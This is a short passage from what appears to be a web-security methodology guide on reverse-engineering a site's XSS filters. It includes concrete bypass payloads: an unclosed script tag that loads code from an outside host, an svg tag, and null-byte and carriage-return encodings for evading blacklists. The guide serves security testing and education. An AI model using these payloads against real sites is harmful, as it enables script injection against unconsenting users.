      <h3>Reverse engineering the developers&#39; thoughts</h3>
    </strong><br /><br />This step is about getting into the developers&#39; heads and figuring out what type of filter
    they&#39;ve created and start asking.. why? Does this same filter exist elsewhere throughout the
    webapp?<br /><br />So for example if I notice they are filtering
    <code>&lt;script&gt;</code>,<code>&lt;iframe&gt;</code> aswell as <code>“onerror=”</code>, but notice they aren’t
    filtering <code>&lt;script</code> then we know it&#39;s game on and time to get creative!<br /> ◇ Are they only
    looking for complete valid HTML tags? <br /> ▪ If so we can bypass with <code>&lt;script src=//mysite.com?c=</code>
    <br /> ◇ Is it just a blacklist of bad HTML tags? <br /> ▪ Perhaps the developer isn&#39;t up to date and forgot
    about things such as &lt;svg&gt;<br /> - Cheatsheet Filter Bypass: <a

    ▪ If it is just a blacklist, then does this blacklist exist elsewhere? Think about file uploads<br /> ◇ How does
    this website in question handle encodings? Try as many different combinations as possible, different encodings,
    formats<br /> ▪ <code>&lt;%00iframe</code><br /> - %00 → null character (NUL)<br /> ▪ <code>on%0derror</code><br />
    - %0d → carriage return<br /><br /><br /><br /><strong>Bibliography:</strong><br />Zseano Methodology: <a
